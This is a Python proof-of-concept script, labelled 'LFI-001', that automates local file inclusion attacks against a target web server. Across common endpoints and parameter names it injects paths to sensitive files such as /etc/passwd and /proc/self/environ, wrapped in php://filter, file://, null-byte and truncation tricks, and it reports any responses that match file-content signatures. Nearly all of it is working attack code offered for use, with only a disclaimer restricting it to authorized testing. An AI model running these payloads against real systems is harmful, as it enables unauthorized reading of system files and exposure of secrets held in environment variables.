#!/usr/bin/env python3
"""
PoC: Local File Inclusion (LFI) - CVE-GENERIC-LFI-001

Vulnerability: Local file inclusion via unvalidated user input in query
parameters that control which file is loaded/included by the server. Unlike
path traversal, LFI specifically targets include/require mechanisms that
interpret file contents as code or return raw file contents through a
file-loading API.

This script injects absolute and relative file paths through common query
parameters and validates responses against known file content signatures.

Usage (authorized testing only):
    python poc_lfi_001.py --target http://localhost:8080 --timeout 10

Exit codes:
    0 - CONFIRMED: vulnerability reproduced
    1 - NOT_REPRODUCED: target does not appear vulnerable
    2 - ERROR: script encountered an error during execution

IMPORTANT: Only use against systems you have explicit written authorization
to test. Unauthorized access to computer systems is illegal.
"""

import argparse
import sys

try:
    import requests
    from requests.exceptions import RequestException
except ImportError:
    print("[ERROR] LFI-001: 'requests' library is required. Install with: pip install requests")
    sys.exit(2)

VULN_ID = "LFI-001"

# Files to attempt inclusion of, with their content signatures
TARGET_FILES = [
    {
        "path": "/etc/passwd",
        "description": "Unix password file",
        "signatures": ["root:", "root:x:0:0:", "daemon:", "/bin/bash", "/bin/sh"],
        "platform": "linux",
    },
    {
        "path": "/etc/hosts",
        "description": "Hosts file",
        "signatures": ["127.0.0.1", "localhost", "::1"],
        "platform": "linux",
    },
    {
        "path": "/etc/hostname",
        "description": "Hostname file",
        "signatures": [],  # Any non-empty response is interesting
        "platform": "linux",
    },
    {
        "path": "/proc/self/environ",
        "description": "Process environment variables",
        "signatures": ["PATH=", "HOME=", "USER=", "HOSTNAME=", "PWD="],
        "platform": "linux",
    },
    {
        "path": "/proc/self/cmdline",
        "description": "Process command line",
        "signatures": ["python", "node", "java", "ruby", "php", "nginx", "apache"],
        "platform": "linux",
    },
    {
        "path": "/proc/version",
        "description": "Kernel version",
        "signatures": ["Linux version", "gcc", "SMP"],
        "platform": "linux",
    },
    {
        "path": "/proc/self/status",
        "description": "Process status",
        "signatures": ["Name:", "State:", "Pid:", "Uid:", "Gid:"],
        "platform": "linux",
    },
    {
        "path": "/etc/os-release",
        "description": "OS release information",
        "signatures": ["NAME=", "VERSION=", "ID=", "PRETTY_NAME="],
        "platform": "linux",
    },
    {
        "path": "/etc/resolv.conf",
        "description": "DNS resolver configuration",
        "signatures": ["nameserver", "search", "domain"],
        "platform": "linux",
    },
    {
        "path": "C:\\Windows\\System32\\drivers\\etc\\hosts",
        "description": "Windows hosts file",
        "signatures": ["127.0.0.1", "localhost"],
        "platform": "windows",
    },
    {
        "path": "C:\\Windows\\win.ini",
        "description": "Windows INI file",
        "signatures": ["[fonts]", "[extensions]", "[mci extensions]"],
        "platform": "windows",
    },
]

# Path transformation wrappers (e.g., PHP wrappers, encoding tricks)
PATH_WRAPPERS = [
    {"name": "direct", "transform": lambda p: p},
    {"name": "php_filter_b64", "transform": lambda p: f"php://filter/convert.base64-encode/resource={p}"},
    {"name": "php_filter_read", "transform": lambda p: f"php://filter/read=string.rot13/resource={p}"},
    {"name": "file_protocol", "transform": lambda p: f"file://{p}"},
    {"name": "null_byte", "transform": lambda p: f"{p}\x00"},
    {"name": "url_encoded_null", "transform": lambda p: f"{p}%00"},
    {"name": "double_slash", "transform": lambda p: f"//{p}"},
    {"name": "dot_truncation", "transform": lambda p: p + "." * 200},
]

# Common vulnerable parameter names
PARAM_NAMES = [
    "file", "page", "include", "path", "doc", "document",
    "template", "view", "module", "load", "resource", "lang",
    "locale", "content", "config", "name", "src", "source",
]

# Common vulnerable endpoint paths
ENDPOINTS = [
    "/",
    "/index.php",
    "/page",
    "/include",
    "/load",
    "/view",
    "/api/file",
    "/api/read",
    "/api/include",
    "/api/template",
    "/render",
]


def check_signatures(response_text, signatures):
    """Check if any known file signatures appear in the response."""
    matched = []
    for sig in signatures:
        if sig in response_text:
            matched.append(sig)
    return matched


def establish_baseline(session, target, timeout):
    """
    Establish baseline responses for comparison.
    Returns baseline response characteristics for common endpoints.
    """
    baselines = {}
    for endpoint in ENDPOINTS:
        url = target.rstrip("/") + endpoint
        try:
            resp = session.get(url, timeout=timeout)
            baselines[endpoint] = {
                "status_code": resp.status_code,
                "content_length": len(resp.text),
                "content_type": resp.headers.get("Content-Type", ""),
            }
        except RequestException:
            baselines[endpoint] = None
    return baselines


def test_inclusion(session, target, endpoint, param_name, file_info, wrapper, timeout):
    """Test a single file inclusion attempt."""
    transformed_path = wrapper["transform"](file_info["path"])
    url = target.rstrip("/") + endpoint

    try:
        response = session.get(
            url,
            params={param_name: transformed_path},
            timeout=timeout,
            allow_redirects=False,
        )

        if response.status_code != 200:
            return None

        if file_info["signatures"]:
            matched_sigs = check_signatures(response.text, file_info["signatures"])
            if matched_sigs:
                return {
                    "url": url,
                    "param": param_name,
                    "file": file_info["path"],
                    "file_description": file_info["description"],
                    "wrapper": wrapper["name"],
                    "status_code": response.status_code,
                    "matched_signatures": matched_sigs,
                    "response_length": len(response.text),
                    "platform": file_info["platform"],
                }
        else:
            # For files without known signatures, check if response looks like file content
            # (non-HTML, non-JSON, contains newlines typical of config files)
            content_type = response.headers.get("Content-Type", "")
            if (
                "text/html" not in content_type
                and len(response.text) > 0
                and "\n" in response.text
            ):
                return {
                    "url": url,
                    "param": param_name,
                    "file": file_info["path"],
                    "file_description": file_info["description"],
                    "wrapper": wrapper["name"],
                    "status_code": response.status_code,
                    "matched_signatures": ["(raw file content detected)"],
                    "response_length": len(response.text),
                    "platform": file_info["platform"],
                }

    except RequestException:
        pass

    return None


def run_exploit(target, timeout):
    """
    Execute the LFI PoC against the target.

    Returns:
        tuple: (exit_code, results_dict)
    """
    results = {
        "vuln_id": VULN_ID,
        "target": target,
        "status": "NOT_REPRODUCED",
        "confirmed_vectors": [],
        "partial_indicators": [],
        "total_requests": 0,
        "errors": [],
    }

    session = requests.Session()
    session.headers.update({
        "User-Agent": "VulnAnalysis-PoC/1.0 (Authorized Security Testing)",
    })

    # Verify target is reachable
    try:
        probe = session.get(target, timeout=timeout)
        print(f"[*] {VULN_ID}: Target reachable (HTTP {probe.status_code})")
    except RequestException as e:
        results["status"] = "ERROR"
        results["errors"].append(f"Target unreachable: {e}")
        return 2, results

    # Establish baselines
    print(f"[*] {VULN_ID}: Establishing baseline responses...")
    baselines = establish_baseline(session, target, timeout)

    total_combos = len(TARGET_FILES) * len(PATH_WRAPPERS) * len(PARAM_NAMES) * len(ENDPOINTS)
    print(f"[*] {VULN_ID}: Testing {total_combos} combinations across {len(ENDPOINTS)} endpoints")

    confirmed = False
    for endpoint in ENDPOINTS:
        if confirmed:
            break
        for param_name in PARAM_NAMES:
            if confirmed:
                break
            for file_info in TARGET_FILES:
                if confirmed:
                    break
                for wrapper in PATH_WRAPPERS:
                    results["total_requests"] += 1
                    result = test_inclusion(
                        session, target, endpoint, param_name,
                        file_info, wrapper, timeout,
                    )

                    if result is not None:
                        results["confirmed_vectors"].append(result)
                        if not confirmed:
                            print(f"[+] {VULN_ID}: LFI CONFIRMED!")
                            print(f"    File: {result['file']} ({result['file_description']})")
                            print(f"    Endpoint: {result['url']}?{result['param']}=...")
                            print(f"    Wrapper: {result['wrapper']}")
                            print(f"    Platform: {result['platform']}")
                            print(f"    Signatures matched: {', '.join(result['matched_signatures'])}")
                            confirmed = True
                            break

    if results["confirmed_vectors"]:
        results["status"] = "CONFIRMED"
        return 0, results

    # Check for partial indicators (different error messages for file paths)
    print(f"[*] {VULN_ID}: Checking for partial indicators...")
    try:
        benign = session.get(
            target.rstrip("/") + "/",
            params={"file": "index"},
            timeout=timeout,
        )
        passwd_req = session.get(
            target.rstrip("/") + "/",
            params={"file": "/etc/passwd"},
            timeout=timeout,
        )
        nonexist = session.get(
            target.rstrip("/") + "/",
            params={"file": "/nonexistent/path/abc123"},
            timeout=timeout,
        )

        status_set = {benign.status_code, passwd_req.status_code, nonexist.status_code}
        if len(status_set) > 1:
            results["partial_indicators"].append({
                "type": "differential_status",
                "detail": "Different HTTP status codes for different file paths",
                "benign_status": benign.status_code,
                "passwd_status": passwd_req.status_code,
                "nonexist_status": nonexist.status_code,
            })

        # Check if error messages reveal file system information
        error_keywords = [
            "No such file", "file not found", "FileNotFoundError",
            "include()", "require()", "fopen()", "Permission denied",
            "open()", "ENOENT", "failed to open stream",
        ]
        for kw in error_keywords:
            if kw.lower() in nonexist.text.lower():
                results["partial_indicators"].append({
                    "type": "error_disclosure",
                    "detail": f"File operation error keyword '{kw}' found in response",
                })
                break

    except RequestException:
        pass

    if results["partial_indicators"]:
        results["status"] = "PARTIAL"
        for ind in results["partial_indicators"]:
            print(f"[~] {VULN_ID}: Partial indicator: {ind['type']} - {ind['detail']}")
        return 1, results

    print(f"[-] {VULN_ID}: No LFI indicators found after {results['total_requests']} requests")
    return 1, results


def main():
    parser = argparse.ArgumentParser(
        description=f"PoC for Local File Inclusion vulnerability ({VULN_ID})",
        epilog="For authorized security testing only.",
    )
    parser.add_argument(
        "--target",
        default="http://localhost:8080",
        help="Target base URL (default: http://localhost:8080)",
    )
    parser.add_argument(
        "--timeout",
        type=int,
        default=30,
        help="Request timeout in seconds (default: 30)",
    )
    args = parser.parse_args()

    target = args.target.rstrip("/")
    if not target.startswith(("http://", "https://")):
        print(f"[ERROR] {VULN_ID}: Target must start with http:// or https://")
        sys.exit(2)

    print(f"[*] {VULN_ID}: Local File Inclusion PoC")
    print(f"[*] {VULN_ID}: Target: {target}")
    print(f"[*] {VULN_ID}: Timeout: {args.timeout}s")
    print(f"[*] {'=' * 60}")

    try:
        exit_code, results = run_exploit(target, args.timeout)
    except KeyboardInterrupt:
        print(f"\n[!] {VULN_ID}: Interrupted by user")
        sys.exit(2)
    except Exception as e:
        print(f"[ERROR] {VULN_ID}: Unhandled exception: {e}")
        sys.exit(2)

    print(f"[*] {'=' * 60}")
    status = results["status"]
    if status == "CONFIRMED":
        print(f"[CONFIRMED] {VULN_ID}: Local file inclusion vulnerability confirmed")
        print(f"    Confirmed vectors: {len(results['confirmed_vectors'])}")
        for vec in results["confirmed_vectors"]:
            print(f"      - {vec['file']} via {vec['wrapper']} wrapper ({vec['param']} param)")
    elif status == "PARTIAL":
        print(f"[PARTIAL] {VULN_ID}: Partial LFI indicators found, manual review needed")
    elif status == "ERROR":
        print(f"[ERROR] {VULN_ID}: {'; '.join(results['errors'])}")
    else:
        print(f"[NOT_REPRODUCED] {VULN_ID}: Local file inclusion not reproduced")

    sys.exit(exit_code)


if __name__ == "__main__":
    main()
